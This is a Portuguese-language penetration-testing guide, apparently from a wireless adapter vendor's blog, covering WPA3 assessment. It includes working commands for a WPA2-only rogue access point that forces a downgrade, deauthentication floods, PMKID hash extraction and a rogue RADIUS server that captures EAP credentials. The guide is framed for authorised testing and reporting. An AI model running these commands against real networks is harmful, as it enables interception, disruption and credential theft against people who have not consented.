---
title: "Testes de Segurança WPA3 com Adaptadores ALFA (2026)"
description: "Guia completo para testes de segurança WPA3 usando adaptadores ALFA Network. Abrange análise do handshake SAE, vulnerabilidades Dragonblood, ataques de downgrade em modo de transição, imposição de PMF e testes EAP para WPA3-Enterprise."
date: 2026-03-24
draft: false
showBreadcrumbs: true
showTableOfContents: true
tags: ["WPA3", "SAE", "dragonblood", "transition-mode", "PMF", "kali-linux", "ALFA-network", "penetration-testing"]
featureimage: "/images/blog/wpa3-security-testing-alfa-2026.webp"
---

{{< alert "triangle-exclamation" >}}
**Aviso Legal:** Todos os testes de segurança sem fio devem ser realizados apenas em redes e dispositivos para os quais você possui autorização explícita e por escrito. As técnicas de teste WPA3, incluindo captura de SAE, desautenticação e implantação de AP falso, estão sujeitas aos mesmos requisitos legais que qualquer outra atividade de avaliação sem fio. Somente testes autorizados.
{{< /alert >}}

O WPA3 representa uma melhoria significativa em relação ao WPA2 tanto na segurança sem fio pessoal quanto empresarial. O SAE (Simultaneous Authentication of Equals) substitui o handshake de Chave Pré-Compartilhada (PSK) por uma troca de chaves autenticada por senha, resistente a ataques de dicionário offline. Os Quadros de Gerenciamento Protegidos (PMF) são obrigatórios. O sigilo de encaminhamento está incorporado.

No entanto, o WPA3 não está isento de vulnerabilidades. A pesquisa Dragonblood (2019) revelou vulnerabilidades de canal lateral e de negação de serviço no handshake SAE. O modo de transição introduz superfícies de ataque de downgrade. Implantações empresariais enfrentam as mesmas fraquezas de validação de certificados 802.1X que o WPA2-Enterprise. Este guia abrange a metodologia completa de testes de segurança WPA3 usando adaptadores ALFA Network, que oferecem a estabilidade do modo monitor e a capacidade de injeção necessárias para uma avaliação completa.

---

## Fundamentos do WPA3 para Testadores de Segurança

### SAE: Simultaneous Authentication of Equals

O SAE substitui o handshake de quatro vias do WPA2-PSK por uma troca de prova de conhecimento zero baseada no protocolo de troca de chaves Dragonfly. A propriedade fundamental para testes de segurança é o **sigilo de encaminhamento**: mesmo que a senha do Wi-Fi seja comprometida posteriormente, o tráfego capturado anteriormente não pode ser descriptografado. Isso elimina o valor principal da quebra offline de senhas contra uma rede exclusivamente SAE.

O SAE também elimina a vulnerabilidade a ataques PMKID que afetavam o WPA2. Não existe um artefato crackável equivalente que um atacante passivo possa extrair de uma associação SAE.

### PMF: Obrigatório no WPA3

Os Quadros de Gerenciamento Protegidos 802.11w são obrigatórios no WPA3. Os quadros de desautenticação e desassociação são protegidos criptograficamente, impedindo os ataques de deauth forjados que são trivialmente eficazes contra redes WPA2 sem PMF. Uma rede exclusivamente WPA3 deve ser imune à aceleração de captura de handshake baseada em desautenticação.

### Modo de Transição WPA3

O cenário de implantação mais comum no mundo real é o **Modo de Transição WPA3**: o AP aceita autenticação tanto WPA3-SAE quanto WPA2-PSK simultaneamente para manter compatibilidade retroativa com dispositivos que não suportam WPA3. Este modo é a principal superfície de ataque nos ambientes empresariais atuais — ele reintroduz a exposição do handshake PSK do WPA2 em uma rede que anuncia WPA3.

### WPA3-Enterprise

O WPA3-Enterprise exige um modo de segurança de 192 bits usando GCMP-256 e HMAC-SHA-384, com autenticação mútua baseada em certificados. Ele aborda as mesmas vulnerabilidades de validação de certificados que o WPA2-Enterprise se não for implantado corretamente. A metodologia de teste para a camada 802.1X está coberta no [framework de avaliação de segurança sem fio empresarial](/pt/blog/enterprise-wireless-security-assessment/).

---

## Ambiente de Teste e Requisitos do Adaptador

### Seleção do Adaptador

Os testes WPA3 exigem um adaptador com modo monitor confiável, suporte a injeção e — para redes WPA3 em 6 GHz — capacidade tribanda:

- **AWUS036AXML** — Necessário para redes WPA3 Wi-Fi 6E (6 GHz). Chipset Mediatek MT7921AUN. Suporte completo a modo monitor e injeção no Kali Linux com kernel 5.18+.
- **AWUS036ACH** — Adequado para testes WPA3 em 2,4/5 GHz. Chipset RTL8812AU. Máxima compatibilidade com o conjunto de ferramentas aircrack-ng e maior suporte a drivers nas versões do Kali Linux.

### Ativar o Modo Monitor

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify monitor interface
iwconfig wlan0mon
```

Para um guia completo de configuração do modo monitor, consulte [Ativar o Modo Monitor no Kali Linux](/pt/blog/enable-monitor-mode-kali-linux/).

### Identificar Redes WPA3 nos Resultados de Varredura

```bash
# Passive scan across all bands
sudo airodump-ng wlan0mon --band abg -w wpa3_scan

# Filter for WPA3 networks in results
sudo airodump-ng wlan0mon --band abg | grep -i "SAE\|WPA3"
```

Na saída do airodump-ng, redes WPA3-SAE aparecem com `WPA3 SAE` na coluna AUTH. Redes em modo de transição exibem `WPA2 WPA3 SAE PSK`. Redes abertas com OWE aprimorado exibem `OWE`.

---

## Fase 1: Captura e Análise do Handshake SAE

### Limitações da Captura Passiva

Ao contrário do WPA2, **handshakes SAE não podem ser usados para ataques de dicionário offline**. Capturar quadros de commit e confirm do SAE é simples com qualquer adaptador em modo monitor, mas o material capturado não produz um hash quebrável. O propósito da captura de quadros SAE é a análise em nível de protocolo — verificar que a variante SAE correta está em uso, confirmar que o PMF está sendo negociado e fornecer evidências no relatório de avaliação.

```bash
# Capture on the target AP channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0mon

# Analyze the capture in Wireshark
# Filter: wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
wireshark -r sae_capture-01.cap
```

Nos quadros de Autenticação, verifique a troca de commit e confirm do SAE. O Elemento de Informação RSN nos quadros Beacon deve mostrar:
- **AKM Suite**: 00-0F-AC:8 (SAE) para WPA3-Personal
- **PMF**: Obrigatório (bit MFPR definido nas RSN Capabilities)

### Teste de PMKID em Redes SAE

```bash
# Attempt PMKID capture — SAE networks should yield no crackable PMKID
sudo hcxdumptool -i wlan0mon -o wpa3_pmkid.pcapng --enable_status=3

hcxpcapngtool -o wpa3_hashes.hc22000 wpa3_pmkid.pcapng
wc -l wpa3_hashes.hc22000
```

---

## Fase 2: Teste de Ataque de Downgrade em Modo de Transição

### A Superfície de Ataque de Downgrade

O Modo de Transição WPA3 é a vulnerabilidade WPA3 de maior impacto nos ambientes empresariais atuais. Quando um AP opera em modo de transição, ele aceita associações SAE e PSK. Um atacante pode criar um AP falso que apresenta apenas capacidades WPA2-PSK para o mesmo SSID — se o cliente se conectar sem exigir SAE, um handshake padrão WPA2 de 4 vias é capturado e pode ser atacado offline.

### Procedimento de Teste

```bash
# Step 1: Confirm the target is in transition mode
sudo airodump-ng wlan0mon --band abg | grep "TARGET_SSID"

# Step 2: Capture the legitimate AP's beacon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_recon wlan0mon

# Step 3: Create a WPA2-only rogue AP
cat > /tmp/rogue_wpa2.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
wpa=2
wpa_passphrase=TestPassphrase123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/rogue_wpa2.conf &

# Step 4: Monitor for client associations
sudo airodump-ng -c 6 --bssid ROGUE_BSSID -w downgrade_capture wlan0mon
```

**Descoberta crítica:** Se um cliente que anteriormente se conectou via SAE se associar ao AP falso apenas com WPA2, o sistema operacional do cliente não está impondo o requisito de WPA3-SAE. Ataque de downgrade bem-sucedido.

---

## Fase 3: Avaliação de Vulnerabilidades Dragonblood

A pesquisa Dragonblood (Vanhoef & Ronen, 2019) identificou múltiplas vulnerabilidades no handshake SAE:

- **CVE-2019-9494 / CVE-2019-9496**: Ataques de canal lateral contra o quadro de commit SAE
- **CVE-2019-9499**: Bypass de confirmação SAE levando ao downgrade de WPA3-Personal
- **DoS via inundação de commit SAE**

### Teste de Token Anti-Clogging SAE

```bash
sudo apt install hcxtools
sudo hcxdumptool -i wlan0mon -o dragonblood_test.pcapng --enable_status=3
wireshark -r dragonblood_test.pcapng
```

### Verificação da Versão de Firmware do AP

- Cisco: Security Advisory cisco-sa-wpa3-sae-side-channel (2019)
- Aruba: ArubaOS 8.6+ corrige Dragonblood
- Ubiquiti: UniFi Network 6.0+ corrige Dragonblood
- MikroTik: RouterOS 6.45.7+ corrige Dragonblood

---

## Fase 4: Teste de Imposição de PMF em Redes WPA3

### Teste de Desautenticação

```bash
# Attempt deauth against a test client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
```

### PMF Capability vs. Required

```bash
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr \
  -c 5 2>/dev/null
```

- `1,1` — PMF Obrigatório: Correto para WPA3
- `1,0` — PMF Capaz mas não Obrigatório: Descoberta de gravidade média
- `0,0` — PMF Desativado: Descoberta de gravidade alta

---

## Fase 5: Teste de OWE (Opportunistic Wireless Encryption)

OWE é a substituição WPA3 para redes de convidados completamente abertas. Realiza uma troca de chaves Diffie-Hellman não autenticada para criptografia por sessão.

```bash
sudo airodump-ng wlan0mon --band abg | grep -E "OWE|\<length: 0\>"
```

---

## Fase 6: Avaliação do WPA3-Enterprise

### Verificação do Modo de Segurança de 192 Bits

```bash
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.pcs.type -e wlan_mgt.rsn.akms.type \
  -c 10 2>/dev/null
```

Esperado: GCMP-256 (00-0F-AC:9) e EAP-SHA384 (00-0F-AC:12).

### Teste com RADIUS Falso

```bash
sudo apt install hostapd-wpe
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Para o procedimento completo, consulte o [framework de avaliação de segurança sem fio empresarial](/pt/blog/enterprise-wireless-security-assessment/).

---

## Referência do Kit de Ferramentas para Testes WPA3

<div class="table-nowrap" style="overflow-x: auto;">

| Ferramenta | Finalidade | Adaptador | Comando Principal |
|---|---|---|---|
| airodump-ng | Descoberta de redes WPA3, captura de quadros SAE | AWUS036AXML / AWUS036ACH | `sudo airodump-ng wlan0mon --band abg` |
| hcxdumptool | Captura de PMKID/SAE, detecção de modo de transição | AWUS036AXML | `sudo hcxdumptool -i wlan0mon -o out.pcapng --enable_status=3` |
| hcxpcapngtool | Converter capturas, detectar exposição WPA2 | N/A (pós-processamento) | `hcxpcapngtool -o hash.hc22000 cap.pcapng` |
| Wireshark / tshark | Análise de RSN IE, capacidade PMF | Qualquer (via arquivo de captura) | `tshark -i wlan0mon -T fields -e wlan_mgt.rsn.capabilities.mfpr` |
| aireplay-ng | Teste de imposição de PMF (deauth) | AWUS036ACH | `sudo aireplay-ng --deauth 10 -a BSSID wlan0mon` |
| hostapd | AP falso somente WPA2 para teste de downgrade | AWUS036ACH | `sudo hostapd /tmp/rogue_wpa2.conf` |
| hostapd-wpe | RADIUS falso para teste EAP com WPA3-Enterprise | AWUS036ACH | `sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf` |

</div>

---

## Resumo de Descobertas para Avaliações WPA3

| ID | Gravidade | Descoberta | Condição |
|---|---|---|---|
| W3-01 | Crítica | Downgrade de WPA3 para WPA2 bem-sucedido; handshake capturado e quebrável | Cliente associou-se ao AP falso somente WPA2; hash recuperado |
| W3-02 | Alta | Modo de transição sem imposição de SAE; PMKID WPA2 exposto | hcxpcapngtool retorna hash quebrável da rede WPA3 |
| W3-03 | Alta | PMF não imposto no SSID WPA3; ataque de deauth bem-sucedido | Cliente de teste desconectado pelo deauth do aireplay-ng |
| W3-04 | Alta | Clientes WPA3-Enterprise aceitam RADIUS falso sem aviso de certificado | hostapd-wpe captura credenciais EAP do cliente de teste |
| W3-05 | Média | PMF Capaz mas não Obrigatório no SSID WPA3 | RSN IE mostra MFPC=1, MFPR=0 |
| W3-06 | Média | WPA3-Enterprise não usa modo de segurança de 192 bits | RSN IE mostra CCMP-128 em vez de GCMP-256 |
| W3-07 | Média | Firmware do AP anterior aos patches Dragonblood | Comparação de versão de firmware com os avisos do fabricante |
| W3-08 | Baixa | Modo de transição OWE; clientes legados conectam-se sem criptografia | SSID aberto visível ao lado do SSID OWE |

---

## Recursos Relacionados

- [Avaliação de Segurança Sem Fio Empresarial: Um Framework Completo](/pt/blog/enterprise-wireless-security-assessment/)
- [Guia de Injeção de Pacotes: Testando seu Adaptador WiFi com aireplay-ng](/pt/blog/packet-injection-guide/)
- [Ativar o Modo Monitor no Kali Linux](/pt/blog/enable-monitor-mode-kali-linux/)
